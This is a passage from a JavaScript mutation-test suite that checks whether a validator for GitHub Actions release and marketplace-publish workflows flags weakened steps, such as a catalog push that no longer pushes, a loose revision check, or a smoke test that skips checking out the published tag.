        .env.MARKETPLACE_REVISION = "${{ needs.marketplace-publish.outputs.marketplace_revision }}";
    }, /plugin-release\.yml post-publish smoke must install from the marketplace revision this release published/u],
    // --- A recovery instruction that cannot be followed ---
    // marketplace-sync.yml mints the same credential from the same environment, so it recovers a
    // rejected push and not a missing credential. Naming it unconditionally recorded a one-click
    // fix that does not exist for the state every release currently reaches.
    ["deferral stops distinguishing a missing credential from a rejected push", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace('if [ "$TOKEN_OUTCOME" != "success" ]; then', "if false; then");
    }, /release\.yml step Record catalog delivery outcome must run if \[ "\$TOKEN_OUTCOME" != "success" \]; then/u],
    ["plugin lane deferral stops naming the credential the recovery needs", workflows => {
      const step = draftStep(pluginPublishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("provision the marketplace-publish credential", "try again");
    }, /plugin-release\.yml step Record catalog delivery outcome must run provision the marketplace-publish credential/u],

    // --- The push step no longer having to push ---
    // Turning the gate into delivery deleted the rule that read this step's body, leaving a job
    // that could mint `catalog_published=true` with the catalog untouched. Both lanes.
    ["catalog push stops pushing anything", workflows => {
      draftStep(publishJob(workflows), "Point the catalog at the published release").run
        = 'echo "catalog untouched"\necho "marketplace_revision=$(printf a%.0s $(seq 40))" >> "$GITHUB_OUTPUT"';
    }, /release\.yml step Point the catalog at the published release must run publish-marketplace-catalog\.mjs/u],
    ["catalog push stops naming the commit it publishes", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = step.run.replace('--commit "$GITHUB_SHA"', "--commit HEAD");
    }, /release\.yml step Point the catalog at the published release must run --commit "\$GITHUB_SHA"/u],
    ["catalog push stops reporting the revision it landed", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = step.run.replace('--github-output "$GITHUB_OUTPUT"', "--quiet");
    }, /release\.yml step Point the catalog at the published release must run --github-output/u],
    ["plugin lane catalog push stops pushing anything", workflows => {
      draftStep(pluginPublishJob(workflows), "Point the catalog at the published release").run
        = 'echo "catalog untouched"';
    }, /plugin-release\.yml step Point the catalog at the published release must run publish-marketplace-catalog\.mjs/u],

    // --- The gate coming back under a different spelling ---
    // `.result` was the only spelling forbidden, so the identical hard gate written as an output
    // comparison passed. Both lanes, and the closeout that reaches the catalog through the smoke.
    ["smoke gates on the catalog output instead of the job result", workflows => {
      smokeCall(workflows).if
        = "always() && inputs.publish_release && needs.preflight.result == 'success'"
        + " && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /must not gate on marketplace-publish in any form/u],
    ["smoke gates on the catalog revision being present", workflows => {
      smokeCall(workflows).if
        = "always() && inputs.publish_release && needs.preflight.result == 'success'"
        + " && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.marketplace_revision != ''";
    }, /must not gate on marketplace-publish in any form/u],
    ["plugin lane smoke gates on the catalog output instead of the job result", workflows => {
      pluginSmokeJob(workflows).if
        = "always() && needs.preflight.result == 'success' && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating on marketplace-publish in any form/u],
    ["post-publish closeout gates on the catalog output instead of the job result", workflows => {
      workflows.get(releaseFile).jobs["post-publish-closeout"].if
        = "inputs.publish_release && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /post-publish closeout must not gate on marketplace-publish succeeding/u],

    // --- A revision test that measures length instead of immutability ---
    ["delivery state accepts any forty characters as a revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["plugin lane delivery state accepts any forty characters as a revision", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["install step accepts any forty characters as a revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Resolve the published plugin through the marketplace catalog");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["release preflight accepts any forty characters as a live revision", workflows => {
      const step = draftStep(
        workflows.get(releaseFile).jobs.preflight,
        "Prove the public marketplace install path",
      );
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],

    // --- The smoke verifying its own workspace against itself ---
    ["smoke stops checking out the published tag", workflows => {
      const checkout = smokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      delete checkout.with;
    }, /post-publish-release-smoke\.yml post-publish smoke must check out the published release tag/u],
    ["plugin lane smoke stops checking out the published tag", workflows => {
      const checkout = pluginSmokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      delete checkout.with;
    }, /plugin-release\.yml post-publish smoke must check out the published release tag/u],
    ["plugin lane smoke checks out its own head instead of the tag", workflows => {
      const checkout = pluginSmokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      checkout.with = { ref: "${{ github.sha }}", "fetch-depth": 0 };
    }, /plugin-release\.yml post-publish smoke must check out the published release tag/u],
    ["smoke stops making GitHub confirm the release is published", workflows => {
      const job = smokeJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Bind this smoke to the published release");
    }, /post-publish-release-smoke\.yml must contain named step Bind this smoke to the published release/u],
    ["plugin lane smoke stops making GitHub confirm the release is published", workflows => {
      const job = pluginSmokeJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Bind this smoke to the published release");
    }, /plugin-release\.yml must contain named step Bind this smoke to the published release/u],
    ["published binding stops comparing GitHub's commit with the checked-out tree", workflows => {
      const step = draftStep(smokeJob(workflows), "Bind this smoke to the published release");
      step.run = step.run.replace(
        'if [ "$published_commit" != "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)" ]; then',
        "if false; then",
      );
    }, /must run if \[ "\$published_commit" != "\$\(git -C "\$GITHUB_WORKSPACE" rev-parse HEAD\)" \]; then/u],
    ["published binding accepts a draft release", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Bind this smoke to the published release");
      step.run = step.run.replace('gh release view "$TAG"', 'gh release list "$TAG"');
    }, /plugin-release\.yml step Bind this smoke to the published release must run gh release view/u],
    ["deferred fixture is pinned to the run's own head again", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        '--commit "$published_commit"',
        '--commit "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"',
      );
    }, /must run --commit "\$published_commit"/u],
    ["plugin lane deferred fixture is pinned to the run's own head again", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        '--commit "$published_commit"',
        '--commit "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"',
      );
    }, /must run --commit "\$published_commit"/u],
    ["delivery state stops reading the published commit binding", workflows => {
      delete draftStep(smokeJob(workflows), "Record catalog delivery state").env.PUBLISHED_COMMIT;
    }, /must pin the commit resolved from the published release/u],
    ["plugin lane delivery state stops reading the published commit binding", workflows => {
      delete draftStep(pluginSmokeJob(workflows), "Record catalog delivery state").env.PUBLISHED_COMMIT;
    }, /plugin-release\.yml catalog delivery state must pin the commit resolved from the published release/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, [], name);
      assert.match(violations.join("\n"), expectedReason, name);
    });
  }
});
